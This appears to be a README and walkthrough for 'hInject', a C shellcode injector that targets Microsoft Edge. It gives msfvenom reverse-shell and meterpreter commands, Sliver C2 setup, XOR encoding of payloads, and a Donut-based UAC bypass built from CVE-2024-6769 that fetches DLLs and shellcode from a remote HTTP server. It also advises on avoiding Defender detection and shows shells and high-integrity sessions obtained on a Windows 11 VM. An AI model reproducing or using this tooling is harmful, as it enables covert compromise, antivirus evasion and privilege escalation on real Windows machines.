**hInject** is a shellcode injector that injects payloads into Microsoft Edge.  
It is written in C language and not really intended to bypass AV solutions, but it has some workarounds such as hiding Some Windows APIs from the IAT using API hashing tactics.  

It includes several methods for shellcode delivery, such as:  
- **Embedded resources**: the shellcode is included in the `.rsc` section of the binary.  
- **Local named pipe**: the server includes the shellcode that **hInject** will grab from a hardcoded named pipe. I added this in case you wanna grape a shell code from a running  beacon or something that created the named pipe for you acting like an intern beacon communication  via named pipes.
- **HTTP method**: fetches the shellcode from a remote HTTP server.  
- **HEX**:  pull the shellcode as hex from the stdin doesn't work with UAC bypass i.e `--elevate` cause donut shellcode for UAC bypass is too big to pass in stdin.  

**hInject** also has a UAC bypass implementation of **CVE-2024-6769** from [fortra/CVE-2024-6769][https://github.com/fortra/CVE-2024-6769].  
It was a pain to re-implement, but I included the DLL that I created as a resource in the repo. Using [**Donut**][https://github.com/TheWover/donut], I converted the UAC bypass into position-independent shellcode and included it as a resource. It will be triggered using `--elevate`. Of course, your DLLs will be pulled from your remote server. It does not always work, but give it a chance — you might get local admin access.  

#### Around AV Advices
**hInject** is very easy to modify and understand. You can remove anything that doesn’t fit your needs:  
-  Remove the HTTP method if you plan to use only resource-based payloads .  
- If you don’t need resources, just remove them and comment out the corresponding code to make it harder to inspect.  
- You can also remove the UAC bypass resource and pull it from a remote HTTP server using the HTTP method if you want to minimize entropy and the size of the `.rsc` section (since Defender might detect it because of that).  

 it actually performed well against Windows Defender in a Windows 11 VM with Defender enabled, as shown in the demos.  

Feel free to extend it with other custom methods. Next time, I will implement a native API shellcode injector — but this one is a good beginning, I guess.  

Testing environment: a Windows 11 with Microsoft Defender enabled
```powershell
systeminfo | findstr /B /C:"Host Name" /C:"Os Name" /C:"Os Version"
```
![[Pasted image 20250829230114.png]]
defender features status
```powershell
Get-MpComputerStatus | Select-Object AMServiceEnabled, AntispywareEnabled, AntivirusEnabled, BehaviorMonitorEnabled, IoavProtectionEnabled, OnAccessProtectionEnabled, RealTimeProtectionEnabled, NISEnabled
```
![[Pasted image 20250829230615.png]]

i compiled the **hInject** as it is  in the repo with defender will upload files to the cloud for 10s but no thread is detected so we passed some static first checks we can use `rasta mouse` tool too for thread detection to see is there any bad bytes that might trigger static detection (in my main windows 11 host). & there is no dad byte or something triggerd
![[Pasted image 20250830011113.png]]

we can take a look at the IAT in [**pestudio**][https://www.winitor.com/download]  too 
![[Pasted image 20250829231743.png]]
The 17 observed flags are related only to `wininet.dll` and `WS2_32.dll` APIs, since these were not hashed. Loading `wininet.dll` is solely for proxying socket calls; implementing Windows sockets directly would conflict with predefined Windows header structures. A simple header implementation for future use can be found here: [**winnet-sockets**][https://gist.github.com/Abdelhadi963/ee38afefc04ace04be76839357dcabde].

There is no `CreateRemoteThread`, `VirtualAlloc`, or `WriteProcessMemory` in the IAT. Functions like `GetCurrentThreadId` and `GetCurrentProcessId` are linked by the C linker and are used only for handling C logic to locate the entry point — they are not actual flags. To eliminate these flags entirely, remove the HTTP method and inject shellcode directly from the embedded resource & just change **inject.c** to the following [inject.c][https://gist.github.com/Abdelhadi963/16a51e4d938269b6ae271a0ce834fe45] & the **parser.h** to [parser.h][https://gist.github.com/Abdelhadi963/5561a581788a29e460c63bab884efa1a] and rebuild the solution.

![[Pasted image 20250829235744.png]]

we can see there is just that 3 default flag cause by default linker and the code still has named pipe ,hex and resource based shellcode injection abilities

let's test this methods now later i will recompile it with http support and we will test elevation too

**help menu** :
![[Pasted image 20250830001234.png]]

> [!NOTE]
> note : default method i using an embedded resource  easy way to do it as follow works for boot http less & with http 

**resource method**
generate shellcode using `msfvenom`
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.136.181 LPORT=443 -f raw -o shellcode.bin
```

encode it am using  `parser_tool.py` using hardcoded XOR key you can change it or the encryption method as your needs
```bash
python parser_tool.py --file shellcode.bin --xor-key ippyokai --binout coffe.bin
```
![[Pasted image 20250830010524.png]]

you know how to embed a resource right :) 
![[Pasted image 20250830001732.png]]

Import your file select all extensions in order to see your  shellcode file then give it a name use the same name in the `core.h` if you don't wanna change every things just name `COFFE` as i did & rebuild the solution.
![[Pasted image 20250830002230.png]]

running resource method i just renamed **hInject** http less version to that name to presist accross the future rebuild
```
.\hInject.exe -m resource
```
![[Pasted image 20250830012038.png]]
we got a shell in **commando VM**
![[Pasted image 20250830012112.png]]

**hex method**
in this part i will test to  use  **meterpreter** shellcode as a staged payload for **sliver C2**
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.136.138 LPORT=4444 -f raw -o shellcode.bin
```
An easy setup for sliver 
```bash
profiles new beacon --mtls 192.168.136.138:4444 --format shellcode hInject
stage-listener -u tcp://192.168.136.138:4444 -p hInject
mtls -L 192.168.136.128 -l 443
```
first we need to generate the hex payload from shellcode using `parser_help.py` as follow
```bash
python3 parser_tool.py --file shellcode.bin --xor-key ippyokai --hexshellcode
```
![[Pasted image 20250830015601.png]]

```
.\hInject -m hex [hex payload]
```
![[Pasted image 20250830015709.png]]
we got the beacon callback then spawned a session and  windows didn't kill any thing
![[Pasted image 20250830015942.png]]

**Named pipe method**
we can do the same serving shellcode using that named pipe server that i included in source code as `PipeServer` project the idea behind it that we can detach the shellcode in another place so that we make our `hInject` clean and server get the shellcode from an named pipe real as a simulation for inter beaconing :)

using the same shellcode from the previous example we need to generate the C array from it an add it in our `PipeServer` code.
```bash
python3 parser_tool.py --file shellcode.bin --xor-key ippyokai --carray --carray-out shellcode.c
```
running the `PipeServer & hInject`
![[Pasted image 20250830022508.png]]
Got beacon callback 
![[Pasted image 20250830022558.png]]

Now back to the full version of `hInject` to test http method & UAC bypass will use a simple tcp reverse shell no need for sliver each time :)

**http method**
usage:
```
.\hInject.exe -m http -i <ip> -p <port> -f </file_name>
```
![[Pasted image 20250830024322.png]]

Got the shell  i used `whoami /priv` to show case that is not elevated 
![[Pasted image 20250830024203.png]]

**UAC bypass**

> [!NOTE]
> the down side about this UAC bypass is using ALPC to register that new entry for tapi32 dll in SxS assembly cache and it's can fails. it's soo picky some how some time the bypass it's self needs to run as an admin i didn't find a work around yet but be aware it's might not work at all so feel free to replace it or remove it. however it's works ! for me here.

Now we can use the `--elevate` flag. We also need to serve the necessary DLLs. For details on how it works, see [fortra/CVE-2024-6769](https://github.com/fortra/CVE-2024-6769?utm_source=chatgpt.com). To trigger the UAC bypass, I will generate a shellcode from `uactrigger.exe` using `Donut`.

reimplemented the trigger for UAC bypass in the `uactrigger` project for `MsCtfMonitor.dll`. I used the same one from [fortra/CVE-2024-6769](https://github.com/fortra/CVE-2024-6769?utm_source=chatgpt.com) sources, but I just patched the message box popup because it’s so tricky to reimplement the activation context request using ALPC and some picky low-level APIs, as explained in the PoC details by `Ricardo Narvaja`. So what you need to modify is just `imm32.dll`. I used my project `uac` to generate the DLL that injects an attached encrypted shellcode into `msedge`. Basically, you just need to change the shellcode attached as a resource.

**elevation steps :)** 
First we need to use [donut][https://github.com/TheWover/donut] to generate our shellcode from `uactrigger.exe`
```bash
./donut -a 2 -f 1 -o daijin.bin -i uactrigger.exe
```
![[Pasted image 20250830030903.png]]

encrypt shellcode again
```bash
python3 parser_tool.py -f ~/Desktop/daijin.bin --xor-key ippyokai --binout uac.bin 
```

As we did before attach it as a resource use `SUZUME` as resource name if you don't wanna change it but change it if you which in `resource.h` and `hInject.rc`  else we will serve our shellcode and payload from a remote http server feel free to test other methods `--reuse` flag is used to use the same http server to serve all the DLLs and the shellcode

> [!NOTE]
> NOTE: don't embed a donut shellcode directly is soo big and might defender

second thing that we need to do generate a reverse shell shellcode & attach it as an embedded resource in `uac.c` file inside `uac` project.

using elevation flag 
```
.\hInject.exe -m http -i 192.168.136.138 -p 80 -f /uac.bin --elevate --reuse  --tapi32-manifest TAPI32.Manifest --injector MsCtfMonitor.dll --payload uac.dll
```
![[Pasted image 20250830075505.png]]
we can see that **TCMSTUP.exe** pops up, and it is the one that loads `tapi32.dll` → our custom `imm32.dll`. The issue is that if the activation context trick fails, it will instead pull `imm32.dll` from `C:\Windows\System32\`, causing the exploit to fail. 
However, we can use pexeplorer to check if it loaded our carfted dll from `C:\windows\system32\tasks`
![[Pasted image 20250830080410.png]]
in this case we can confirm that we obtained a shell with high integrity level and full administrative privileges.
![[Pasted image 20250830080510.png]]

for namedpip method is works as the same you need just to provide ip and port for the server from where we will pull neccessary DLLs for the bypass and place donut  trigger shellcode inside namedpipe server.

